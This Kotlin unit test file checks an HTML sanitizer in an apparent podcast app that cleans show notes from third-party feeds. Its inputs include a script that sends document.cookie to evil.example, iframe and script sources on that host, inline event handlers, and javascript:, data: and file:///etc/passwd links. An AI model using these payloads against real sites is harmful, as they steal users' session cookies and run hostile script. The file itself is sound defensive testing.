package net.koalastuff.koalacast.core.ui.component

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * Show notes come straight out of a third-party feed, so these are adversarial cases,
 * not happy paths.
 */
class HtmlSanitizerTest {

    @Test
    fun `script blocks are removed with their contents`() {
        val sanitized = HtmlSanitizer.sanitize(
            "<p>Notes</p><script>fetch('https://evil.example/'+document.cookie)</script>",
        )
        assertFalse(sanitized.contains("script", ignoreCase = true))
        assertFalse(sanitized.contains("evil.example"))
        assertTrue(sanitized.contains("Notes"))
    }

    @Test
    fun `style and iframe blocks go too`() {
        val sanitized = HtmlSanitizer.sanitize(
            "<style>body{display:none}</style><iframe src=\"https://evil.example\"></iframe><b>kept</b>",
        )
        assertFalse(sanitized.contains("display:none"))
        assertFalse(sanitized.contains("iframe", ignoreCase = true))
        assertTrue(sanitized.contains("<b>kept</b>"))
    }

    @Test
    fun `inline event handlers are stripped in every quoting style`() {
        val sanitized = HtmlSanitizer.sanitize(
            """<a href="https://example.org" onclick='steal()' onerror=boom() onmouseover="x">link</a>""",
        )
        assertFalse(sanitized.contains("onclick", ignoreCase = true))
        assertFalse(sanitized.contains("onerror", ignoreCase = true))
        assertFalse(sanitized.contains("onmouseover", ignoreCase = true))
        assertTrue(sanitized.contains("https://example.org"))
    }

    @Test
    fun `javascript and data hrefs are removed`() {
        val sanitized = HtmlSanitizer.sanitize(
            """<a href="javascript:alert(1)">a</a><img src="data:text/html;base64,PHN2Zz4=">""",
        )
        assertFalse(sanitized.contains("javascript:", ignoreCase = true))
        assertFalse(sanitized.contains("data:text/html", ignoreCase = true))
    }

    @Test
    fun `an unterminated script tag is still dropped`() {
        val sanitized = HtmlSanitizer.sanitize("<p>a</p><script src=\"https://evil.example/x.js\">")
        assertFalse(sanitized.contains("script", ignoreCase = true))
    }

    @Test
    fun `only web and mail links are followed`() {
        assertTrue(HtmlSanitizer.isSafeLink("https://example.org"))
        assertTrue(HtmlSanitizer.isSafeLink("http://example.org"))
        assertTrue(HtmlSanitizer.isSafeLink("mailto:hi@example.org"))
        assertFalse(HtmlSanitizer.isSafeLink("javascript:alert(1)"))
        assertFalse(HtmlSanitizer.isSafeLink("intent://scan/#Intent;scheme=zxing;end"))
        assertFalse(HtmlSanitizer.isSafeLink("file:///etc/passwd"))
        assertFalse(HtmlSanitizer.isSafeLink(""))
    }

    @Test
    fun `ordinary markup survives untouched`() {
        val html = "<p>A quiet <em>episode</em> about <a href=\"https://example.org\">maps</a>.</p>"
        assertEquals(html, HtmlSanitizer.sanitize(html))
    }
}
